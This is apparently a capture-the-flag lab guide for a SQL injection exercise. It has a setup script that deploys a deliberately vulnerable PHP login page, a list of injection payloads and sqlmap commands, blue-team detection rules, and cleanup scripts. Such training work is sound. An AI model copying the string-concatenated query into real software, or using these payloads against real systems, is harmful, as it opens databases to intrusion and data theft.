# Intermediate CTF Scenario 1: SQL Injection

## Overview
Web application with SQL injection vulnerability allowing database enumeration and flag extraction. Provides realistic web application security training.

## Scenario Details
- **Difficulty**: Intermediate
- **Attack Vectors**: SQL injection, database enumeration, web application exploitation
- **Skills Tested**: SQL injection techniques, database interaction, web app analysis
- **Expected Time**: 20-30 minutes

## Setup

### Prerequisites
- Apache2 web server
- MySQL/MariaDB database
- PHP

### Setup Script
```bash
#!/bin/bash
# setup_sql_injection.sh

echo "[+] Setting up SQL Injection scenario..."

# Install required packages
sudo apt-get update -qq
sudo apt-get install -y apache2 mysql-server php php-mysql

# Start services
sudo systemctl start apache2
sudo systemctl start mysql
sudo systemctl enable apache2
sudo systemctl enable mysql

# Set up MySQL database
sudo mysql -e "CREATE DATABASE ctf_db;"
sudo mysql -e "CREATE USER 'ctf_user'@'localhost' IDENTIFIED BY 'ctf_pass123';"
sudo mysql -e "GRANT ALL PRIVILEGES ON ctf_db.* TO 'ctf_user'@'localhost';"
sudo mysql -e "FLUSH PRIVILEGES;"

# Create database schema and data
sudo mysql ctf_db << 'EOF'
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(100) NOT NULL,
    email VARCHAR(100)
);

CREATE TABLE flags (
    id INT AUTO_INCREMENT PRIMARY KEY,
    flag_name VARCHAR(50),
    flag_value VARCHAR(100)
);

INSERT INTO users (username, password, email) VALUES
('admin', 'secret_admin_pass', 'admin@company.com'),
('user1', 'mypassword', 'user1@company.com'),
('guest', 'guest123', 'guest@company.com');

INSERT INTO flags (flag_name, flag_value) VALUES
('main_flag', 'APTL{sql_1nj3ct10n_m4st3r}'),
('bonus_flag', 'APTL{d4t4b4s3_3num3r4t10n}');
EOF

# Create vulnerable PHP application
sudo mkdir -p /var/www/html/login
cat << 'EOF' | sudo tee /var/www/html/login/index.php > /dev/null
<!DOCTYPE html>
<html>
<head>
    <title>Company Login Portal</title>
    <style>
        body { font-family: Arial; margin: 50px; }
        .container { max-width: 400px; margin: auto; }
        input[type=text], input[type=password] { width: 100%; padding: 10px; margin: 5px 0; }
        input[type=submit] { background: #4CAF50; color: white; padding: 10px 20px; border: none; cursor: pointer; }
        .error { color: red; }
        .success { color: green; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Employee Login Portal</h2>
        <form method="POST" action="">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Login" name="submit">
        </form>
        
        <?php
        if (isset($_POST['submit'])) {
            $servername = "localhost";
            $db_username = "ctf_user";
            $db_password = "ctf_pass123";
            $dbname = "ctf_db";
            
            $conn = new mysqli($servername, $db_username, $db_password, $dbname);
            
            if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
            }
            
            $username = $_POST['username'];
            $password = $_POST['password'];
            
            // VULNERABLE SQL QUERY - DO NOT USE IN PRODUCTION
            $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
            $result = $conn->query($sql);
            
            if ($result->num_rows > 0) {
                echo "<div class='success'>Login successful! Welcome " . htmlspecialchars($username) . "</div>";
                echo "<p>You have access to the employee portal.</p>";
                
                // Show flags for successful SQL injection
                if (strpos($username, "UNION") !== false || strpos($username, "union") !== false) {
                    echo "<div class='success'>DEBUG MODE: SQL injection detected!</div>";
                    $flag_sql = "SELECT flag_value FROM flags WHERE flag_name = 'main_flag'";
                    $flag_result = $conn->query($flag_sql);
                    if ($flag_result && $flag_result->num_rows > 0) {
                        $flag_row = $flag_result->fetch_assoc();
                        echo "<div style='background: #f0f0f0; padding: 10px; margin: 10px 0;'>";
                        echo "<strong>Flag:</strong> " . $flag_row['flag_value'];
                        echo "</div>";
                    }
                }
            } else {
                echo "<div class='error'>Invalid username or password!</div>";
                // Show SQL error for debugging (bad practice but useful for CTF)
                if ($conn->error) {
                    echo "<div style='background: #ffe6e6; padding: 10px; margin: 10px 0; font-size: 12px;'>";
                    echo "<strong>SQL Error:</strong> " . $conn->error;
                    echo "</div>";
                }
            }
            
            $conn->close();
        }
        ?>
        
        <hr>
        <p><small>Hint: Try common usernames like 'admin' or check for SQL injection vulnerabilities.</small></p>
    </div>
</body>
</html>
EOF

# Create database info page (for enumeration)
cat << 'EOF' | sudo tee /var/www/html/login/info.php > /dev/null
<?php
// Database information page
$servername = "localhost";
$username = "ctf_user";
$password = "ctf_pass123";
$dbname = "ctf_db";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

echo "<h2>Database Tables</h2>";
$result = $conn->query("SHOW TABLES");
while ($row = $result->fetch_array()) {
    echo "Table: " . $row[0] . "<br>";
}

$conn->close();
?>
EOF

# Set proper permissions
sudo chown -R www-data:www-data /var/www/html/
sudo chmod -R 755 /var/www/html/

echo "[+] SQL Injection scenario deployed!"
echo "[+] Target: http://localhost/login/"
echo "[+] Vulnerable parameter: username field"
echo "[+] Database: ctf_db with users and flags tables"
echo "[+] Try SQL injection: admin' OR '1'='1"
```

### Manual Setup Steps
1. Install LAMP stack: `sudo apt-get install apache2 mysql-server php php-mysql`
2. Create MySQL database `ctf_db` with user `ctf_user`
3. Create tables: `users` and `flags`
4. Deploy vulnerable PHP login application
5. Start Apache and MySQL services

## Attack Methodology

### Expected Attack Path
1. **Reconnaissance**: Discover login portal
2. **Application Analysis**: Test login functionality
3. **SQL Injection Discovery**: 
   - Test for injection points
   - Analyze error messages
4. **Database Enumeration**:
   - Extract table names
   - Dump user data
   - Retrieve flags
5. **Flag Extraction**: Use UNION-based injection

### Key Commands Red Team Will Use
```bash
# Web reconnaissance
nmap -sV -p 80 <target_ip>
dirb http://<target_ip>/

# Manual SQL injection testing
# In username field:
admin' OR '1'='1' --
admin' OR '1'='1' #
' UNION SELECT 1,2,3 --

# Database enumeration
' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema='ctf_db' --

# Column enumeration
' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='flags' --

# Flag extraction
' UNION SELECT null,flag_value,null FROM flags --

# Using automated tools
sqlmap -u "http://<target_ip>/login/" --data="username=admin&password=test&submit=Login" --dbs
sqlmap -u "http://<target_ip>/login/" --data="username=admin&password=test&submit=Login" -D ctf_db --tables
sqlmap -u "http://<target_ip>/login/" --data="username=admin&password=test&submit=Login" -D ctf_db -T flags --dump
```

## Blue Team Detection Signatures

### Log Patterns to Monitor
```
# Apache access logs (/var/log/apache2/access.log)
- POST requests to /login/ with SQL keywords
- Multiple failed login attempts
- Unusual user-agent strings (sqlmap, etc.)
- Large response sizes indicating data extraction

# MySQL query logs (if enabled)
- UNION SELECT statements
- Information_schema queries
- Multiple queries from same source
```

### Detection Rules
```
# SQL injection keywords in POST data
POST data contains: UNION, SELECT, information_schema, OR 1=1

# SQLMap detection
User-Agent contains: sqlmap

# Database enumeration
Queries to information_schema.tables, information_schema.columns

# Multiple login failures followed by success
Failed logins > 3 followed by successful response

# Large response sizes
Response size > 5KB for login endpoint

# SQL error messages in response
Response contains: "SQL Error", "mysql_", "syntax error"
```

## Cleanup

### Cleanup Script
```bash
#!/bin/bash
# cleanup_sql_injection.sh

echo "[+] Cleaning up SQL Injection scenario..."

# Stop services
sudo systemctl stop apache2
sudo systemctl stop mysql

# Remove web application
sudo rm -rf /var/www/html/login/

# Remove database
sudo mysql -e "DROP DATABASE IF EXISTS ctf_db;"
sudo mysql -e "DROP USER IF EXISTS 'ctf_user'@'localhost';"

# Clear logs (optional)
# sudo truncate -s 0 /var/log/apache2/access.log
# sudo truncate -s 0 /var/log/mysql/error.log

echo "[+] SQL Injection scenario cleaned up!"
```

### Manual Cleanup Steps
1. Stop services: `sudo systemctl stop apache2 mysql`
2. Remove web files: `sudo rm -rf /var/www/html/login/`
3. Drop database: `sudo mysql -e "DROP DATABASE ctf_db;"`
4. Remove database user
5. Clear logs (optional)

## Reset to Basic State

### Reset Script
```bash
#!/bin/bash
# reset_sql_injection.sh

echo "[+] Resetting SQL Injection to basic state..."

# Run cleanup first
./cleanup_sql_injection.sh

# Wait for services to stop
sleep 5

# Run setup again
./setup_sql_injection.sh

echo "[+] SQL Injection scenario reset complete!"
```

## Investigation Opportunities

### For Blue Team Analysis
- Web application attack patterns
- SQL injection detection techniques
- Database query analysis
- Attack tool identification (SQLMap signatures)
- Data exfiltration detection
- Timeline reconstruction from access logs

### Advanced Analysis
- Payload analysis and categorization
- Automated vs. manual attack detection
- Error message information disclosure
- Response size analysis for data extraction
- Correlation between failed and successful attempts

### Learning Objectives
- Web application security monitoring
- SQL injection attack vectors
- Database security fundamentals
- Application log analysis
- Automated tool detection
- Incident response to data breaches

## Security Notes
- Contains deliberately vulnerable code for educational purposes
- Should only be deployed in isolated lab environments
- Demonstrates common web application security flaws
- Real applications should use parameterized queries and input validation